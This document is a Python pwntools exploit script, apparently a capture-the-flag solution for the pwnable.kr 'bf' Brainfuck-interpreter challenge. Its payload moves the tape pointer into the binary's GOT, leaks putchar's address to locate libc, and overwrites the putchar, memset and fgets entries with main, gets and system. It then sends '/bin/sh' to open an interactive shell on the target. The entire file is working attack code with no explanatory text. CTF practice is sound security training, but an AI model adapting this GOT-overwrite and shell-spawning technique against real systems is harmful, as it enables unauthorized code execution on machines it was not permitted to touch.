from pwn import *
import sys
context.log_level = 'debug'
elf_s = ELF('./bf')

if sys.argv[1] == 'connect':
    bin = remote('pwnable.kr',9001)
else:
    bin = process('./bf')
libc = ELF('./bf_libc.so')
#libc = ELF('/usr/lib32/libc.so.6')
putchar_got_addr = elf_s.got['putchar']
memset_got_addr = elf_s.got['memset']
fget_got_addr = elf_s.got['fgets']
p = 0x0804a0a0
main_addr = elf_s.symbols['main']

def back(n):
    return '<'*n

def read(n):
    return '.>'*n

def write(n):
    return ',>'*n

payload = '<'*(p-putchar_got_addr) + '.' + read(4)
payload += '<'*4 + write(4)
payload += '<'*(putchar_got_addr-memset_got_addr+4) + write(4)
payload += '<'*(memset_got_addr-fget_got_addr+4) + write(4)
payload += '.'

bin.recvuntil('[ ]\n')                                                                                            
bin.sendline(payload)                                                                                             
bin.recv(1)                                                                                                       
putchar_addr = u32(bin.recv(4))
print hex(putchar_addr)
log.success('putchar_addr: ' + hex(putchar_addr))                                                                   
#gdb.attach(bin)

libc_base = putchar_addr - libc.symbols['putchar']
gets_addr = libc_base + libc.symbols['gets']
system_addr = libc_base + libc.symbols['system']

log.success('libc_base addr: '+hex(libc_base))
log.success('gets addr: '+hex(gets_addr))
log.success('system addr: '+hex(system_addr))

bin.send(p32(main_addr))
bin.send(p32(gets_addr))
bin.send(p32(system_addr))
bin.sendline('/bin/sh')
bin.interactive()   
